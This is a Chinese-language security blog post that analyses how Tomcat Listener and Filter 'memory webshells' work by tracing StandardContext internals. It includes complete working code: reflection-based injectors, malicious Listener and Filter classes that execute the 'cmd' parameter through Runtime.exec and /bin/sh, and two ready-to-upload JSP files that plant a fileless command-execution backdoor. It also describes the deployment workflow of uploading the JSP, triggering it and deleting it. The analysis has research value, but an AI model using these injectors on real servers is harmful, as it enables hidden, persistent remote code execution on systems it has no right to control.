<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    
    
    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>tomcat Listener，Filter内存马简要分析 - ConsT27's Blog</title>
    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "tomcat Listener\uff0cFilter\u5185\u5b58\u9a6c\u7b80\u8981\u5206\u6790", url: "#_top", children: [
              {title: "\u76ee\u5f55", url: "#_1" },
              {title: "tomcat \u5bb9\u5668", url: "#tomcat" },
              {title: "Listener \u5185\u5b58\u9a6c", url: "#listener" },
              {title: "Filter \u5185\u5b58\u9a6c", url: "#filter" },
              {title: "\u603b\u7ed3", url: "#_4" },
              {title: "\u53c2\u8003", url: "#_5" },
          ]},
        ];

    </script>
    <script src="../../../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
        tomcat websocket内存马
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
        java agent内存马
      </a>
    </div>
    
  </div>

    

    <h1 id="tomcat-listenerfilter">tomcat Listener，Filter内存马简要分析</h1>
<h2 id="_1">目录</h2>
<ul>
<li><a href="#tomcat-容器">tomcat 容器</a></li>
<li><a href="#Listener-内存马">Listener 内存马</a><ul>
<li><a href="#ServletContext">ServletContext</a></li>
<li><a href="#ApplicationContext">ApplicationContext</a></li>
<li><a href="#编写Listener内存马">编写Listener内存马</a></li>
</ul>
</li>
<li><a href="#Filter-内存马">Filter 内存马</a><ul>
<li><a href="#doFilter方法如何被执行">doFilter方法如何被执行？</a><ul>
<li><a href="#配置filter">配置filter</a></li>
<li><a href="#filterchain">filterchain</a></li>
<li><a href="#filterconfig与filterdef">filterconfig与filterdef</a></li>
<li><a href="#下面的两层">下面的两层</a></li>
<li><a href="#加载过程流程图">加载过程流程图</a></li>
</ul>
</li>
<li><a href="#FilterDef添加">FilterDef添加</a></li>
<li><a href="#编写Filter内存马">编写Filter内存马</a></li>
</ul>
</li>
<li><a href="#总结">总结</a></li>
<li><a href="#参考">参考</a></li>
</ul>
<hr />
<h2 id="tomcat">tomcat 容器</h2>
<p>tomcat 主要包含四种容器：Engine，Host，Context，Wrapper。其对应关系如下图</p>
<p><img alt="image-20210406203203615" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210406203203615.png" title="image-20210406203203615" /></p>
<p>详细解读一下这个图。</p>
<p>一台服务器上是可以配置多个站点的，对于tomcat来说，每一个站点就对应一个HOST。</p>
<p>一个站点上是可以配置多个WEB应用的，比如说一个站点可能会有OA，SSO，邮件应用等等WEB应用，对于tomcat来说每一个WEB应用便对应着一个Context。</p>
<p>一个WEB应用中肯定也有多个访问路径，比如说OA可能就有登录，前端展示，搜索等。所以对于每一个访问路径tomcat都会分配一个Wrapper，每一个Wrapper对应一个Servlet，用于处理特定请求。</p>
<h2 id="listener">Listener 内存马</h2>
<p>tomcat收到请求时，处理顺序是 Listener-&gt;Filter-&gt;Servlet。
也就是说Listener是最先接触到数据请求的，我们可以在Listener上做手脚从而达到内存马的目的。</p>
<p>实际上，我们想实现一个内存马，思路便是想让tomcat执行一段恶意程序，把恶意的listener或者filter类写入tomcat内存中，由于tomcat处理请求时，请求会被listener和filter处理（也就是说会被我们的恶意类处理），因此达到隐蔽的木马功能。</p>
<p>具体怎么个实现呢？我们可以大致想象一个思路：获取服务器初步权限后，创建一个JSP并向内写入向内存注入恶意Listener或filter的代码，随后访问JSP触发JSP代码，恶意Listener或filter被注入内存，随后删除JSP，通过恶意Listener或filter实现无文件webshell。但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错，具体解决方法就是下文的内容了：</p>
<h3 id="servletcontext">ServletContext</h3>
<p>如果我们想添加一个Listener，那么势必会用到一个方法：addListener。</p>
<p>我们来分析以下这个方法，想办法通过addListener方法把恶意Listener注入内存。
首先addListener方法是这么用的。</p>
<pre><code class="language-纯文本">ServletContext servletContext = this.getServletConfig().getServletContext();
servletContext.addListener(&quot;&quot;);
</code></pre>
<p>我们直接跟进addListener，会发现跟进到了ServletContext这个接口类。</p>
<p><img alt="" src="../image/image_BvnBeo9gXj.png" /></p>
<p>那么实现addListener的类是什么呢？换句话说，servletContext这个实例化对象是如何被实例化的呢？</p>
<h3 id="applicationcontext">ApplicationContext</h3>
<p><img alt="image-20210626150652699" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626150652699.png" title="image-20210626150652699" /></p>
<p>通过调试，我们发现servletContext这个对象实际上是一个ApplicationContextFacade对象。
我们跟进到ApplicationContextFacade.class中，查看addListener方法的实现。</p>
<p><img alt="image-20210626151054515" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626151054515.png" title="image-20210626151054515" /></p>
<p>发现实际上是调用了ApplicationContext类的addListener方法。再次跟进。</p>
<p><img alt="image-20210626153212402" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626153212402.png" title="image-20210626153212402" /></p>
<p>这里还调用了一个addListener，再次跟进。</p>
<p><img alt="image-20210626154012832" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154012832.png" title="image-20210626154012832" /></p>
<p>这里借用的别人的图，可以发现如果服务器已启动，那么通过直接调用addListener是无法添加监听器的。</p>
<p>究其原因，便是此处的context是StandardContext，它的状态是开始状态，无法在if判断中返回true。
这也就是上文提到的  "但是由于一些原因导致直接通过addListener或者addFilter来添加监听器或过滤器会报错"</p>
<p><img alt="image-20210626154229868" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626154229868.png" title="image-20210626154229868" /></p>
<p>如果能够突破if判断，来到此处，那么监听器就会被顺利的添加上</p>
<p><img alt="image-20210626155428011" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626155428011.png" title="image-20210626155428011" /></p>
<h3 id="listener_1">编写Listener内存马</h3>
<p>既然阻碍我们添加Listener的原因已经找到了，那么就应该考虑如何绕过这个限制了。
很简单，通过反射即可绕过这个限制。</p>
<p>在编写反射代码之前，我们有必要去看一下，我们怎样才能通过反射"够到"StandardContext的addApplicationEventListener方法。</p>
<p><img alt="image-20210626160137366" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626160137366.png" title="image-20210626160137366" /></p>
<p>可以直观的看到，我们可以通过servletContext获得它的context属性（ApplicationContext对象），然后通过ApplicationContext对象的context获得StandardContext对象，然后调用addApplicationEventListener方法。很好。</p>
<pre><code class="language-纯文本">反射代码
            ServletContext servletContext = this.getServletConfig().getServletContext();
            Field field = servletContext.getClass().getDeclaredField(&quot;context&quot;);
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(servletContext);
            field = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
            field.setAccessible(true);
            StandardContext standardContext = (StandardContext) field.get(applicationContext);
            standardContext.addApplicationEventListener(new MyListener(request,response)); //这一行是将某个Listener类添加到监听器
</code></pre>
<pre><code class="language-纯文本">恶意Listener
public class MyListenr implements ServletRequestListener {

    public ServletResponse response;
    public ServletRequest request;

    MyListenr(ServletRequest request, ServletResponse response) {
        this.request = request;
        this.response = response;
    }

    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
    }

    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        String cmder = request.getParameter(&quot;cmd&quot;);
        try {
            Process ps = Runtime.getRuntime().exec(cmder);
            BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
            StringBuffer sb = new StringBuffer();
            String line;
            while ((line = br.readLine()) != null) {
                //执行结果加上回车
                sb.append(line).append(&quot;&lt;br&gt;&quot;);
            }
            String result = sb.toString();
            this.response.getWriter().write(result);
        } catch (Exception e) {
            System.out.println(&quot;error &quot;);
        }

    }
}
</code></pre>
<p>实验一下</p>
<p><img alt="image-20210626162713503" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162713503.png" title="image-20210626162713503" /></p>
<p>我们先访问/a路由，让代码被执行。然后到任意页面传入恶意参数</p>
<p><img alt="image-20210626162750746" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626162750746.png" title="image-20210626162750746" /></p>
<p>SUCCESS。</p>
<p>为了更方便的注入内存马，我从网上嫖了一个JSP（Linux版）。只要我们上传该JSP然后访问它一下，内存马就被注入了，十分的方便。</p>
<pre><code class="language-纯文本">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;
&lt;%@ page import=&quot;org.apache.jasper.tagplugins.jstl.core.Out&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;javax.servlet.annotation.WebServlet&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;
&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;
&lt;%
     Object obj = request.getServletContext();
     Field field = obj.getClass().getDeclaredField(&quot;context&quot;);
     field.setAccessible(true);
     ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
     field = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
     field.setAccessible(true);
     StandardContext standardContext = (StandardContext) field.get(applicationContext);
     ListenH listenH = new ListenH(request, response);
    standardContext.addApplicationEventListener(listenH);
    out.print(&quot;test&quot;);
%&gt;
&lt;%!
    public class ListenH implements ServletRequestListener {
        public ServletResponse response;
        public ServletRequest request;

        ListenH(ServletRequest request, ServletResponse response) {
            this.request = request;
            this.response = response;
        }

        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        }

        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
            String cmder = request.getParameter(&quot;cmd&quot;);
            String[] cmd = new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmder};
            try {
                Process ps = Runtime.getRuntime().exec(cmd);
                BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                StringBuffer sb = new StringBuffer();
                String line;
                while ((line = br.readLine()) != null) {
                    //执行结果加上回车
                    sb.append(line).append(&quot;&lt;br&gt;&quot;);
                }
                String result = sb.toString();
                this.response.getWriter().write(result);
            }catch (Exception e){
                System.out.println(&quot;error &quot;);
            }

        }
    }
%&gt;
</code></pre>
<h2 id="filter">Filter 内存马</h2>
<p><a href="http://wjlshare.com/archives/1529" title="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p>
<p>Filter内存马与Listener内存马还是有点区别的，要复杂一点点</p>
<h3 id="dofilter">doFilter方法如何被执行？</h3>
<h4 id="filter_1">配置filter</h4>
<p>再开始分析Filter内存马时，我们需要先知道，Filter类中的doFilter方法是如何被执行的。</p>
<p>OK我们先创建好一个Filter。</p>
<pre><code>Filter类代码

import javax.servlet.*;
import java.io.IOException;

public class MyFilter implements Filter {
    public void destroy() {
    }
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
        System.out.println(&quot;Filter!&quot;);
        chain.doFilter(req,resp);
    }
    public void init(FilterConfig config) throws ServletException {
    }
}

maven
        &lt;dependency&gt;
            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
            &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
            &lt;version&gt;3.0.1&lt;/version&gt;
            &lt;scope&gt;provided&lt;/scope&gt;
        &lt;/dependency&gt;

</code></pre>
<p>接下来在web.xml中添加Filter。</p>
<p><img alt="image-20210626193215688" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626193215688.png" title="image-20210626193215688" /></p>
<p>我们在doFilter方法处下断点，运行，得到调用帧如下</p>
<p><img alt="image-20210626204005990" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204005990.png" title="image-20210626204005990" /></p>
<h4 id="filterchain">filterchain</h4>
<p>我们从StandardWrapperValue#invoke 处开始分析.</p>
<pre><code>filterChain.doFilter(request.getRequest(), response.getResponse());
</code></pre>
<p>那么这个filterChain是什么？我们跟进一下</p>
<p><img alt="image-20210626204524626" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204524626.png" title="image-20210626204524626" /></p>
<p>再度跟进到createFilterChain方法，来到了ApplicationFilterFactory.java里。</p>
<p>比较关键的代码是这里。这个方法会遍历FilterMaps，检测每个FilterMap项对应的那个Filter与请求的路由等是否一致。若一致则将以该filter的name为参数去FilterConfigs里去寻找对应的FilterConfig,然后将该filterconfig放入filterchain中。不一致的则抛弃。</p>
<p><img alt="image-20210626204752458" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626204752458.png" title="image-20210626204752458" /></p>
<h4 id="filterconfigfilterdef">filterconfig与filterdef</h4>
<p>那么filterconfig又是个什么样的东西呢？</p>
<p>我们跟进context.findFilterConfig,这里的context是StandardContext。</p>
<p><img alt="image-20210626205344727" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205344727.png" title="image-20210626205344727" /></p>
<p>再度跟进filterconfigs，就可以很明显的发现filterconfigs是一个hashmap结构 键为filter名，值为filterconfig</p>
<p><img alt="image-20210626205418654" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205418654.png" title="image-20210626205418654" /></p>
<p>那么filterconfig的结构又是如何。我们跟进ApplicationFilterConfig类。下图是此类的构造函数</p>
<p><img alt="image-20210626205854332" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626205854332.png" title="image-20210626205854332" /></p>
<p>关键地方圈出来了是与filterdef有关的代码。在构造函数的时候将传入context和filterdef，然后再通过对filterdef调用getfilter获得filter类（即我们自己定义的filter类）。</p>
<p>我们再看看filterDef的关键代码</p>
<p><img alt="image-20210626210144048" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210144048.png" title="image-20210626210144048" /></p>
<p><img alt="image-20210626210116555" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210116555.png" title="image-20210626210116555" /></p>
<p>OKOK，上面就是FilterConfig，FilterChain和FilterDef的一些零碎的介绍。</p>
<p>我们大致可以得到下列关键信息</p>
<pre><code>FilterConfigs 是一个HashMap结构，键为filter名，值为filterconfig
filterconfig包含了filterdef
filterdef直接与filter类相关联
</code></pre>
<p>StandardWrapperValue#invoke 这一层分析完了，这一层是最麻烦的，向下两层将会亲切很多。</p>
<h4 id="_2">下面的两层</h4>
<p>向下分析来到ApplicationFilterChain#doFilter.这一层很简单，调了个internalDofilter就没了</p>
<p><img alt="image-20210626210643466" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210643466.png" title="image-20210626210643466" /></p>
<p>再向下分析来到ApplicationFilterChain#internalDoFilter。</p>
<p><img alt="image-20210626210808889" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210626210808889.png" title="image-20210626210808889" /></p>
<p>关键的地方圈出来了，大致就是通过filterchain里的filterconfig的getFilter方法（下图为getFilter方法，可以明显看到是返回了filter）从而获得filterdef里的filter，从而调用filter的dofilter，这就是大概的流程。</p>
<p><img alt="image-20210627113023603" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627113023603.png" title="image-20210627113023603" /></p>
<h4 id="_3">加载过程流程图</h4>
<p>文字总是有些贫瘠的，用图来说话就会明了许多。</p>
<p><img alt="image-20210627115155496" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627115155496.png" title="image-20210627115155496" /></p>
<h3 id="filterdef">FilterDef添加</h3>
<p>我们如何把FilterDef与我们的Filter关联起来并添加到standardContext中呢？这个问题比较关键，因为我们必须将我们的FilterDef注入到内存才能让我们的Filter有被调用的可能性。</p>
<p>实际上呢，也很简单。流程上来说与Listener内存马差不多</p>
<p>打断点</p>
<p><img alt="image-20210627122501784" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122501784.png" title="image-20210627122501784" /></p>
<p>跟进</p>
<p><img alt="image-20210627122632548" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122632548.png" title="image-20210627122632548" /></p>
<p>再跟</p>
<p><img alt="image-20210627122645331" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122645331.png" title="image-20210627122645331" /></p>
<p>继续跟</p>
<p><img alt="image-20210627122745165" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122745165.png" title="image-20210627122745165" /></p>
<p>来到此处，与Listener内存马神似。</p>
<p>if判断里判断了程序是否在运行</p>
<p>context是standardContext，这里调用了它的addFilterDef来添加FilterDef。</p>
<h3 id="filter_2">编写Filter内存马</h3>
<p>用反射，原因和Listener是一样的。</p>
<pre><code class="language-纯文本">反射代码
try {
            response.getWriter().write(&quot;a&quot;);
            System.out.println(&quot;Servlet Get Message\n&quot;);
            Object obj = request.getServletContext();
            Field field = obj.getClass().getDeclaredField(&quot;context&quot;);
            field.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
            field = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
            field.setAccessible(true);
            StandardContext standardContext = (StandardContext) field.get(applicationContext);
            //获取standardContext

            FilterDef filterDef = new FilterDef();
            filterDef.setFilter(new MyFilter());
            filterDef.setFilterName(&quot;MyFilter&quot;);
            standardContext.addFilterDef(filterDef);
            //将FilterDef与filter关联，注入到内存

            field = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
            field.setAccessible(true);
            HashMap filterConfigs = (HashMap) field.get(standardContext);//获取filterConfigs
            Constructor constructor =
                    Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).
                            getDeclaredConstructor(Context.class, FilterDef.class);
            constructor.setAccessible(true);
            filterConfigs.put(&quot;MyFilter&quot;,constructor.newInstance(standardContext,filterDef));
            //将包含filterDef的filterConfig添加到filterConfigs

            FilterMap filterMap = new FilterMap();
            filterMap.addURLPattern(&quot;/*&quot;);
            filterMap.setFilterName(&quot;MyFilter&quot;);
            standardContext.addFilterMapBefore(filterMap);
            //将该filterMap与filterConfig进行NAME绑定并放到filterMaps的首位


        } catch (IOException | NoSuchFieldException | IllegalAccessException | ClassNotFoundException | NoSuchMethodException | InstantiationException | InvocationTargetException e) {
            e.printStackTrace();
        }
</code></pre>
<pre><code class="language-纯文本">木马本体
public class MyFilter implements Filter {
    public void destroy() {
    }
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
        String cmder = req.getParameter(&quot;cmd&quot;);
        try {
            Process ps = Runtime.getRuntime().exec(cmder);
            BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
            StringBuffer sb = new StringBuffer();
            String line;
            while ((line = br.readLine()) != null) {
                //执行结果加上回车
                sb.append(line).append(&quot;&lt;br&gt;&quot;);
            }
            String result = sb.toString();
            resp.getWriter().write(result);
        }catch (Exception e){
            System.out.println(&quot;error &quot;);
        }
        chain.doFilter(req,resp);
    }
    public void init(FilterConfig config) throws ServletException {
    }
}
</code></pre>
<p>网上嫖的JSP</p>
<pre><code class="language-纯文本">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;
&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;
&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;
&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;
&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;
&lt;%@ page import=&quot;java.util.HashMap&quot; %&gt;
&lt;%@ page import=&quot;java.io.BufferedReader&quot; %&gt;
&lt;%@ page import=&quot;java.io.InputStreamReader&quot; %&gt;
&lt;%
     Object obj = request.getServletContext();
     Field field = obj.getClass().getDeclaredField(&quot;context&quot;);
     field.setAccessible(true);
     ApplicationContext applicationContext = (ApplicationContext) field.get(obj);
     field = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
     field.setAccessible(true);
     StandardContext standardContext = (StandardContext) field.get(applicationContext);

     FilterDef filterDef = new FilterDef();
     filterDef.setFilterName(&quot;testF&quot;);
     standardContext.addFilterDef(filterDef);  // 在context中添加filterMap时会去找一下是否存在对应的filterdef
     Filter filter = new testF();
     filterDef.setFilter(filter); // 将我们创建的filter与filterdef相关联起来

     field = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);
     field.setAccessible(true);
     HashMap hashMap =  (HashMap) field.get(standardContext);
     Constructor constructor = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;).getDeclaredConstructor(Context.class, FilterDef.class);
     constructor.setAccessible(true);
     hashMap.put(&quot;testF&quot;,constructor.newInstance(standardContext,filterDef));

     FilterMap filterMap = new FilterMap();
     filterMap.addURLPattern(&quot;/*&quot;);
     filterMap.setFilterName(&quot;testF&quot;);
     standardContext.addFilterMapBefore(filterMap);
     System.out.println(&quot;filter ok !&quot;);
%&gt;
&lt;%!
     public class testF implements Filter {
          public void destroy() {
          }
          public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws ServletException, IOException {
               String cmder = req.getParameter(&quot;cmd&quot;);
               String[] cmd = new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmder};
               try {
                    Process ps = Runtime.getRuntime().exec(cmd);
                    BufferedReader br = new BufferedReader(new InputStreamReader(ps.getInputStream()));
                    StringBuffer sb = new StringBuffer();
                    String line;
                    while ((line = br.readLine()) != null) {
                         //执行结果加上回车
                         sb.append(line).append(&quot;&lt;br&gt;&quot;);
                    }
                    String result = sb.toString();
                    resp.getWriter().write(result);
               }catch (Exception e){
                    System.out.println(&quot;error &quot;);
               }
               chain.doFilter(req,resp);
          }
          public void init(FilterConfig config) throws ServletException {
          }
     }

%&gt;
</code></pre>
<p><img alt="image-20210627122022432" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210627122022432.png" title="image-20210627122022432" /></p>
<h2 id="_4">总结</h2>
<p>个人感觉这篇文章写的比较乱，特别是Filter内存马。
这也是我拖了3个月才来搞的东西，这学期事有点多，很多之前想搞的东西都没腾出时间弄。
这篇文章讲到的内存马实际上并没有实现完全的无文件落地，中间会有恶意JSP文件落地。更高级的攻击形式后面再搞吧。</p>
<h2 id="_5">参考</h2>
<p><a href="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/" title="http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/">http://li9hu.top/tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E4%B8%80-%E5%88%9D%E6%8E%A2/</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext" title="https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext">https://www.cnblogs.com/nice0e3/p/14622879.html#servletcontext</a></p>
<p><a href="http://wjlshare.com/archives/1529" title="http://wjlshare.com/archives/1529">http://wjlshare.com/archives/1529</a></p>
<p><a href="https://blog.csdn.net/angry_program/article/details/116661899" title="https://blog.csdn.net/angry_program/article/details/116661899">https://blog.csdn.net/angry_program/article/details/116661899</a></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/tomcat%20websocket%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
        tomcat websocket内存马
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/java%20agent%E5%86%85%E5%AD%98%E9%A9%AC/" class="btn btn-xs btn-link">
        java agent内存马
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>